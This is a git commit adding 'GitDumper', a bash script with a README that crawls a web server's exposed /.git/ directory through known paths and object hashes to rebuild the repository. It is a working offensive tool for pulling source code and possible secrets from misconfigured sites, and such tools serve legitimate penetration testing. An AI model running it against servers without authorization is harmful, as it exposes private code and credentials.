a7e78fae32259eac4e7750f8b154c2c588280fa5
Sebastian Gehaxelt <github@gehaxelt.in>
2015-07-28 20:09:57 +0200

    Added gitdumper.sh

---
+++ Dumper/README.md
@@ -0,0 +1,17 @@
+GitDumper
+=================
+This is a tool for downloading .git repositories from webservers which do not have directory listing enabled. 
+
+#Requirements
+- git
+- curl
+- bash
+- sed
+
+#Usage
+
+```
+bash http://target.tld/.git/ dest-dir
+```
+
+Note: This tool has no 100% guaranty to completely recover the .git repository. Especially if the repository has been compressed into ```pack```-files, it may fail.
---
+++ Dumper/gitdumper.sh
@@ -0,0 +1,117 @@
+#!/bin/bash
+#$1 : URL to download .git from (http://target.com/.git/)
+#$2 : Folder where the .git-directory will be created
+QUEUE=();
+DOWNLOADED=();
+BASEURL="$1";
+BASEDIR="$2";
+BASEGITDIR="$BASEDIR/.git/";
+
+if [ $# -ne 2 ]; then
+    echo "USAGE: http://target.tld/.git/ dest-dir";
+    exit 1;
+fi
+
+
+if [[ ! "$BASEURL" =~ /.git/$ ]]; then
+    echo "/.git/ missing in url";
+    exit 0;
+fi
+
+if [ ! -d "$BASEGITDIR" ]; then
+    echo "Destination folder does not exist";
+    echo "Creating $BASEGITDIR";
+    mkdir -p "$BASEGITDIR";
+fi
+
+
+function start_download() {
+    QUEUE+=('HEAD')
+    QUEUE+=('objects/info/packs')
+    QUEUE+=('description')
+    QUEUE+=('config')
+    QUEUE+=('COMMIT_EDITMSG')
+    QUEUE+=('index')
+    QUEUE+=('packed-refs')
+    QUEUE+=('refs/heads/master')
+    QUEUE+=('refs/remotes/origin/HEAD')
+    QUEUE+=('refs/stash')
+    QUEUE+=('logs/HEAD')
+    QUEUE+=('logs/refs/heads/master')
+    QUEUE+=('logs/refs/remotes/origin/HEAD')
+    QUEUE+=('info/refs')
+    QUEUE+=('info/exclude')
+
+    while [ ${#QUEUE[*]} -gt 0 ]
+    do
+        download_item ${QUEUE[@]:0:1}
+        QUEUE=( "${QUEUE[@]:1}" )
+    done
+}
+
+function download_item() {
+    local objname=$1
+    local url="$BASEURL$objname"
+    local hashes=()
+    local packs=()
+
+    #Check if file has already been downloaded
+    if [[ " ${DOWNLOADED[@]} " =~ " ${objname} " ]]; then
+        return
+    fi
+
+    local target="$BASEGITDIR$objname"
+
+    #Create folder
+    dir=$(echo "$objname" | grep -oP "^(.*)/")
+    if [ $? -ne 1 ]; then
+        mkdir -p "$BASEGITDIR/$dir"
+    fi
+
+    #Download file
+    curl -s "$url" > "$target"
+    
+    #Mark as downloaded and remove it from the queue
+    DOWNLOADED+=("$objname")
+	echo "Downloaded: $objname"
+	
+	#Check if we have an object hash
+	if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
+		#Switch into $BASEDIR and save current working directory
+		cwd=$(pwd)
+		cd "$BASEDIR"
+		
+		#Restore hash from $objectname
+		hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
+		
+		#Check if it's valid git object
+		git cat-file -t "$hash" &> /dev/null
+		if [ $? -ne 0 ]; then
+			#Delete invalid file
+			cd "$cwd"
+			rm "$target"
+			return 
+		fi
+		
+		#Parse output of git cat-file -p $hash
+ 		hashes+=($(git cat-file -p "$hash" | grep -oP "([a-f0-9]{40})"))
+
+		cd "$cwd"
+	fi 
+	
+    #Parse file
+    hashes+=($(cat "$target" | grep -oP "([a-f0-9]{40})"))
+    for hash in ${hashes[*]}
+    do
+        QUEUE+=("objects/${hash:0:2}/${hash:2}")
+    done
+
+    packs+=($(cat "$target" | grep -oP "(pack\-[a-f0-9]{40})"))
+    for pack in ${packs[*]}
+    do 
+        QUEUE+=("objects/pack/$pack.pack")
+        QUEUE+=("objects/pack/$pack.idx")
+    done
+}
+
+start_download
